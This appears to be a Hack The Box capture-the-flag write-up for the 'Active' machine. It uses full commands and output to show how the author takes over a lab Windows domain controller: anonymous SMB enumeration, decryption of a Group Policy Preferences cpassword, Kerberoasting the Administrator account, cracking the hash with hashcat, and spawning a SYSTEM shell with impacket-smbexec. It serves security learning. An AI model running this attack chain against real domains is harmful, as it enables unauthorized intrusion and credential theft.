---
tags:
  - gpp-decrypt
  - kerberoasting
group: ActiveDirectory
---
![](https://labs.hackthebox.com/storage/avatars/5837ac5e28291146a9f2a8a015540c28.png)

- Machine : https://app.hackthebox.com/machines/Active
- Reference : https://0xdf.gitlab.io/2018/12/08/htb-active.html
- Solved : 2024.12.05. (Thu) (Takes 1days)

## Summary
---

1. **Initial Enumeration**
    - **Port Scanning**:
        - Identified open ports: DNS (53), Kerberos (88), LDAP (389, 3268), SMB (139, 445), RPC, and others.
        - Confirmed the domain as `active.htb` and the hostname `DC`.
        - Determined the operating system: `Windows Server 2008 R2 SP1`.
    - **DNS**:
        - Attempted DNS zone transfer using `dig axfr` but it failed.
    - **LDAP and SMB**:
        - Explored LDAP but received no useful results due to permission issues.
        - Used `enum4linux` and `smbclient` to find accessible SMB shares.
        - Found the `Replication` share to be accessible anonymously.
        
2. **Extracting Credentials**
    - Discovered and downloaded the file `Groups.xml` from the `Replication` share.
    - Found an encrypted `cpassword` in the `Groups.xml` file.
    - Decrypted the `cpassword` using `gpp-decrypt`, revealing credentials for the `SVC_TGS` account:
        - **Username**: `active.htb\SVC_TGS`
        - **Password**: `GPPstillStandingStrong2k18`
        
3. **Kerberos Enumeration and Roasting**
    - Used the `SVC_TGS` account credentials to enumerate Kerberos services with `impacket-GetUserSPNs`.
    - Identified the `Administrator` account's Kerberos Service Principal Name (SPN).
    - Extracted the Kerberos TGS hash for the `Administrator` account.
    - Cracked the TGS hash using `hashcat` and the `rockyou.txt` wordlist:
        - **Administrator Password**: `Ticketmaster1968`
        
4. **Administrative Access**
    
    - Tested the `Administrator` credentials using `crackmapexec` and confirmed access to the domain controller over SMB.
    - Used `impacket-smbexec` to spawn a shell as `Administrator`.
    - Verified administrative privileges with `whoami`:
        - **Privilege Level**: `NT AUTHORITY\SYSTEM`

### Key Techniques:

- **Enumeration**: Used tools like `enum4linux`, `ldapsearch`, and `smbclient` to identify potential attack vectors.
- **GPP Password Extraction**: Exploited the `Groups.xml` file to retrieve and decrypt stored credentials.
- **Kerberoasting**: Extracted and cracked the Kerberos TGS hash to escalate privileges.
- **Privilege Escalation**: Direct access to `Administrator` via cracked credentials.
- **SMB Exploitation**: Leveraged SMB to gain and maintain access to the domain controller.

---

# Reconnaissance

### Port Scanning

```bash
┌──(kali㉿kali)-[~/htb]
└─$ ./port-scan.sh 10.10.10.100
Performing quick port scan on 10.10.10.100...
Found open ports: 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49165,49166,49168
Performing detailed scan on 10.10.10.100...
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-04 12:58 EST
Nmap scan report for 10.10.10.100
Host is up (0.15s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-04 17:58:31Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
49166/tcp open  msrpc         Microsoft Windows RPC
49168/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-12-04T17:59:29
|_  start_date: 2024-12-04T17:54:12

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 78.37 seconds
```

- DNS(53) is running.. It reveals OS version : `Windows Server 2008 R2 SP1`
- Kerberos(88), RPC(135), SMB(139,445), LDAP(389, 3268)
- Domain name : `active.htb`

### DNS(53)

```yaml
┌──(kali㉿kali)-[~/htb]
└─$ dig any @10.10.10.100 active.htb

; <<>> DiG 9.20.0-Debian <<>> any @10.10.10.100 active.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: FORMERR, id: 63437
;; flags: qr rd; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1232
; COOKIE: dacd6de7641e6c44 (echoed)
;; QUESTION SECTION:
;active.htb.                    IN      ANY

;; Query time: 124 msec
;; SERVER: 10.10.10.100#53(10.10.10.100) (TCP)
;; WHEN: Wed Dec 04 13:46:38 EST 2024
;; MSG SIZE  rcvd: 51

                                                                           
┌──(kali㉿kali)-[~/htb]
└─$ dig axfr @10.10.10.100 active.htb

; <<>> DiG 9.20.0-Debian <<>> axfr @10.10.10.100 active.htb
; (1 server found)
;; global options: +cmd
; Transfer failed.
```

No further domains found.

### LDAP(389)

```bash
┌──(kali㉿kali)-[~/htb]
└─$ ldapsearch -H ldap://10.10.10.100 -x -b "DC=ACTIVE,DC=HTB" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "


┌──(kali㉿kali)-[~/htb]
└─$ ldapsearch -H ldap://10.10.10.100 -x -b "DC=ACTIVE,DC=HTB" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

```

No output.

```vbnet
┌──(kali㉿kali)-[~/htb]
└─$ rpcclient -U '' -N 10.10.10.100
rpcclient $> enumdomusers
do_cmd: Could not initialise samr. Error was NT_STATUS_ACCESS_DENIED
rpcclient $> querydominfo
do_cmd: Could not initialise samr. Error was NT_STATUS_ACCESS_DENIED
```

Access denied.

### SMB(139,445)

Let's run `enum4linux` to scan SMB service thoroughly.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ enum4linux -a 10.10.10.100
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Dec  4 14:11:43 2024

<SNIP>

[+] Got OS info for 10.10.10.100 from srvinfo:                             
        10.10.10.100   Wk Sv PDC Tim NT     Domain Controller              
        platform_id     :       500
        os version      :       6.1
        server type     :       0x80102b

 ===========( Share Enumeration on 10.10.10.100 )=========== 
 
do_connect: Connection to 10.10.10.100 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.10.100                               
                                                                           
//10.10.10.100/ADMIN$   Mapping: DENIED Listing: N/A Writing: N/A          
//10.10.10.100/C$       Mapping: DENIED Listing: N/A Writing: N/A
//10.10.10.100/IPC$     Mapping: OK Listing: DENIED Writing: N/A
//10.10.10.100/NETLOGON Mapping: DENIED Listing: N/A Writing: N/A
//10.10.10.100/Replication      Mapping: OK Listing: OK Writing: N/A
//10.10.10.100/SYSVOL   Mapping: DENIED Listing: N/A Writing: N/A
//10.10.10.100/Users    Mapping: DENIED Listing: N/A Writing: N/A
```

Only one share `Replication` is readable and accessible.
Let's list and fetch the files in it.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ smbclient \\\\10.10.10.100\\Replication
Password for [WORKGROUP\kali]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  active.htb                          D        0  Sat Jul 21 06:37:44 2018

                5217023 blocks of size 4096. 278585 blocks available
smb: \> prompt off
smb: \> recurse on
smb: \> mget *
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI of size 119 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI (0.2 KiloBytes/sec) (average 0.1 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (5.4 KiloBytes/sec) (average 1.4 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (1.0 KiloBytes/sec) (average 1.4 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (2.1 KiloBytes/sec) (average 1.5 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3722 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (7.2 KiloBytes/sec) (average 2.3 KiloBytes/sec)


┌──(kali㉿kali)-[~/htb/active.htb]
└─$ tree                                                    
.
├── DfsrPrivate
│   ├── ConflictAndDeleted
│   ├── Deleted
│   └── Installing
├── Policies
│   ├── {31B2F340-016D-11D2-945F-00C04FB984F9}
│   │   ├── GPT.INI
│   │   ├── Group Policy
│   │   │   └── GPE.INI
│   │   ├── MACHINE
│   │   │   ├── Microsoft
│   │   │   │   └── Windows NT
│   │   │   │       └── SecEdit
│   │   │   │           └── GptTmpl.inf
│   │   │   ├── Preferences
│   │   │   │   └── Groups
│   │   │   │       └── Groups.xml
│   │   │   └── Registry.pol
│   │   └── USER
│   └── {6AC1786C-016F-11D2-945F-00C04fB984F9}
│       ├── GPT.INI
│       ├── MACHINE
│       │   └── Microsoft
│       │       └── Windows NT
│       │           └── SecEdit
│       │               └── GptTmpl.inf
│       └── USER
└── scripts

22 directories, 7 files
```


# Obtain as `SVC_TGS`'s credential

### Investigate `Group.xml` file

Among the listed files, `Groups.xml` seems useful since it might contains `gpp-encypted password`.

```bash
┌──(kali㉿kali)-[~/…/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups]
└─$ cat Groups.xml       
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

I can find `cpassword` value : `edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ`
Let's decrypt it using `gpp-decrypt`.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ

GPPstillStandingStrong2k18
```

I extracted `SVC_TGS`'s credential : `GPPstillStandingStrong2k18`



# Shell as `Administrator`

### SMB shares

Let's test this credential using `crackmapexec`.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ crackmapexec smb 10.10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k18
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18
```

Let's check which SMB shares are readable with `SVC_TGS`'s account.

```sql
┌──(kali㉿kali)-[~/htb]
└─$ crackmapexec smb 10.10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k18 --shares
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
SMB         10.10.10.100    445    DC               [+] Enumerated shares
SMB         10.10.10.100    445    DC               Share           Permissions     Remark
SMB         10.10.10.100    445    DC               -----           -----------     ------
SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.100    445    DC               C$                              Default share
SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
SMB         10.10.10.100    445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.10.100    445    DC               Replication     READ            
SMB         10.10.10.100    445    DC               SYSVOL          READ            Logon server share 
SMB         10.10.10.100    445    DC               Users           READ       
```

`NETLOGON`, `Replicaion`, `SYSVOL`, `Users` are now accessible.
Among these shares, `Users` looks extraordinary.
Let's see what's in it.

```bash
┌──(kali㉿kali)-[~/htb/smb_users]
└─$ smbclient -U "active.htb\SVC_TGS" \\\\10.10.10.100\\Users
Password for [ACTIVE.HTB\SVC_TGS]:
Try "help" to get a list of possible commands.
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
<SNIP>

┌──(kali㉿kali)-[~/htb/smb_users]
└─$ tree
.
├── Administrator
├── All Users
├── Default
│   ├── AppData
│   │   ├── Local
│   │   │   ├── Application Data
│   │   │   ├── History
│   │   │   ├── Microsoft
│   │   │   │   └── Windows
│   │   │   │       ├── GameExplorer
│   │   │   │       ├── History
│   │   │   │       └── Temporary Internet Files
│   │   │   ├── Temp
│   │   │   └── Temporary Internet Files
│   │   └── Roaming
│   │       └── Microsoft
│   │           ├── Internet Explorer
│   │           │   └── Quick Launch
│   │           │       ├── Server Manager.lnk
│   │           │       ├── Shows Desktop.lnk
│   │           │       ├── Window Switcher.lnk
│   │           │       └── desktop.ini
│   │           └── Windows
│   │               ├── Cookies
│   │               ├── Network Shortcuts
│   │               ├── Printer Shortcuts
│   │               ├── Recent
│   │               ├── SendTo
│   │               │   ├── Compressed (zipped) Folder.ZFSendToTarget
│   │               │   ├── Desktop (create shortcut).DeskLink
│   │               │   ├── Desktop.ini
│   │               │   └── Mail Recipient.MAPIMail
│   │               ├── Start Menu
│   │               │   └── Programs
│   │               │       ├── Accessories
│   │               │       │   ├── Accessibility
│   │               │       │   │   ├── Desktop.ini
│   │               │       │   │   ├── Ease of Access.lnk
│   │               │       │   │   ├── Magnify.lnk
│   │               │       │   │   ├── Narrator.lnk
│   │               │       │   │   └── On-Screen Keyboard.lnk
│   │               │       │   ├── Command Prompt.lnk
│   │               │       │   ├── Desktop.ini
│   │               │       │   ├── Notepad.lnk
│   │               │       │   ├── Run.lnk
│   │               │       │   ├── System Tools
│   │               │       │   │   ├── Control Panel.lnk
│   │               │       │   │   ├── Desktop.ini
│   │               │       │   │   └── computer.lnk
│   │               │       │   └── Windows Explorer.lnk
│   │               │       └── Maintenance
│   │               │           ├── Desktop.ini
│   │               │           └── Help.lnk
│   │               └── Templates
│   ├── Application Data
│   ├── Cookies
│   ├── Desktop
│   ├── Documents
│   │   ├── My Music
│   │   ├── My Pictures
│   │   └── My Videos
│   ├── Downloads
│   ├── Favorites
│   ├── Links
│   ├── Local Settings
│   ├── Music
│   ├── My Documents
│   ├── NTUSER.DAT
│   ├── NTUSER.DAT.LOG
│   ├── NTUSER.DAT.LOG1
│   ├── NTUSER.DAT.LOG2
│   ├── NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
│   ├── NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
│   ├── NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
│   ├── NetHood
│   ├── Pictures
│   ├── PrintHood
│   ├── Recent
│   ├── Saved Games
│   ├── SendTo
│   ├── Start Menu
│   ├── Templates
│   └── Videos
├── Default User
├── Public
├── SVC_TGS
│   ├── Contacts
│   ├── Desktop
│   │   └── user.txt
│   ├── Downloads
│   ├── Favorites
│   ├── Links
│   ├── My Documents
│   ├── My Music
│   ├── My Pictures
│   ├── My Videos
│   ├── Saved Games
│   └── Searches
└── desktop.ini

68 directories, 32 files
```

### Kerberoasting

Apart from `user.txt` flag, there's no other useful files from this share.
Since we obtained a valid credential, we can try `Kerberoasting`.

```bash
┌──(kali㉿kali)-[~/htb/smb_users]
└─$ impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request 
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2024-12-04 12:55:29.126570             


[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$ee35553d8fb521801f6eb5799aebe0d8$5c7607edb2191596da1a1214e13ba50f2aeb9f63df89f14e8c94c488377aa3c83556111627d4ab08208f624dd68bea82a89a1e3464ddd42edae720c64b915f5fb96c567ee71a9b29bb752ea92a0c92d477ff1f1a5f94932024b0f976aefabefc72fefab887417fa36b29987f771d2e24f5de1f853ce2a81abde82d178a8874146e6884a1d80cbe265c8c3c5d9e65698061865d5d3ae019bbd793de4f59d78bc861deef411b435001ac79e2383a2b6fd62724c8b6435a4698e73b8da26c03f001b4f05d5db1aae36f668ab2ddddbd3b1d16f2a8e30e9885b780e1e4400ed28b84242dbf3f12daae52fa145c005f3b94bb0cc0a28d2584bf87f09d2f062aea2d878e1ce6b2dcee5480c8f1d7b7e72e94d2b8afde80e5bb35e1d48d108151d5602dbe9d5756a4d2d8364051df7242a8f482470c9b1e699772545307c90293b685cb085ab984496a2fa3e4507550246ae95b6588e1de8ed1d2c385ba80b06679910e92dec805678d883a97f1ac39c0ba19d3214652cdc7cc77f7afc842828fb1bb65c0a500889cae02f6dd27aa16f3d6713f856566c46ee4cebf27b1f43ab7738318c607c7b92be19a40444c9b813f7d7e03554a173dd4a8a9e5991d21a388be151bfcf21afecaa928c492683733985727f9a5a6ab5d78afc2d2fefc04fcb6bea96a5fb540e3a8d192b91b2981977f16ea9f7a9b246de2d8cf926694a494c2a808256624c9c1076a41c68d1ff2bc1fee5a304c859f03c9325b07978ac705748f0a69880c526bbeeb659524ee35ba37e4103f9396ba3e2cd3f8afa247c14fa9801ceb48ec3ed09dea6e6830b182f8e023f823347e7d0387d7d66873510b71a5bda6494194d13aa6760e4ed5bd38fcd681bd6b8fff859fced43a04cf3cd6aeda857b19a4d2502df18f9764f7b8e6d32df917a5ed0702de026b9ce021fa34b0fa4f96f642a735dd7e75c86c8b16d1d4ff95b87262976fe96944218bf6c5cc2df4f09cebd39887ac1f8cc54d223b9505795af8e7c93cab41e5f7f916eedb07bd6b2e4f532d9b1e1a98383e9b65fe999d864d341ad350aa75687f5c491ee7bc8dbe9fec87a7d5481065e20312cdfecd6f69634a5e1c370d8c1dde2664a8b96508c1f22caba69237a63bffabd77212fb0b8b4e0901562fed49d4cd195457611c0dc89c42c22d1f2aec6a626a87da83c4269cc9da1f8f7e5a1e9052f79d629d950be73c6ffa05def1a1cd2c69dc18258634fa34181d55846f3a272c2bbb8540
```

Bingo! I found `Administrator`'s hash!
Let's crack it.

```bash
┌──(kali㉿kali)-[~/htb/smb_users]
└─$ hashcat -m 13100 -a 0 administrator.krb /usr/share/wordlists/rockyou.txt.gz 
hashcat (v6.2.6) starting

<SNIP>
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$ee35553d8fb5
<SNIP>
a05def1a1cd2c69dc18258634fa34181d55846f3a272c2bbb8540:Ticketmaster1968
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Ad...bb8540
Time.Started.....: Wed Dec  4 14:59:26 2024 (5 secs)
Time.Estimated...: Wed Dec  4 14:59:31 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt.gz)
<SNIP>
```

It worked! I could successfully crack and obtain `administrator`'s password : `Ticketmaster1968`.

Let's test this credential using `crackmapexec`.

```bash
┌──(kali㉿kali)-[~/htb/smb_users]
└─$ crackmapexec smb 10.10.10.100 -u administrator -p Ticketmaster1968
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\administrator:Ticketmaster1968 (Pwn3d!)
                                                                            
┌──(kali㉿kali)-[~/htb/smb_users]
└─$ crackmapexec winrm 10.10.10.100 -u administrator -p Ticketmaster1968
```

It works with `smb` protocol, not with `winrm`.
Still I can spawn a shell with `impacket-smbexec`.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ impacket-smbexec active.htb/administrator:'Ticketmaster1968'@10.10.10.100
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system
```

Yes! I got a root!